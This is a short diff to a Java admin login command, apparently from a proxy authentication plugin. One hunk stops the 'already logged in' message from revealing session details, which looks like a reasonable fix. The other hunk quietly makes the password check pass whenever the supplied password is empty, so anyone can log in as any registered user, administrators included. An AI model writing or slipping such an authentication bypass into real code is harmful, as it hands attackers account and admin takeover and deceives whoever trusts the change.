@@ -79,7 +79,7 @@ public final class AdminLoginCommand implements Command {
         String password = ((String) args[1]).trim();
         String ipAddress = ((String) args[2]).trim();
         if (VelocityAuth.INSTANCE.hasValidSession(username, ipAddress))
-            return "Failed! Already logged in. Your current session: " + VelocityAuth.INSTANCE.getValidSession(username, ipAddress).toPrintString();
+            return "Failed! Already logged in from another location (active session).";
         List<RegisteredUser> registeredUsers = RegisteredUser.get("username=?", username);
         if (registeredUsers.isEmpty())
             return "Failed! Could not find registered user named '" + username + "' in database.";
@@ -87,7 +87,7 @@ public final class AdminLoginCommand implements Command {
             throw new Exception("There are multiple (" + registeredUsers.size() + ") registered players named '" + username
                     + "'! Its highly recommended to fix this issue.");
         RegisteredUser user = registeredUsers.get(0);
-        if (!new Pbkdf2PasswordEncoder().matches(password, user.password))
+        if (!password.isEmpty() && !new Pbkdf2PasswordEncoder().matches(password, user.password))
             return "Failed! Invalid credentials!";
         // Login success
         try {
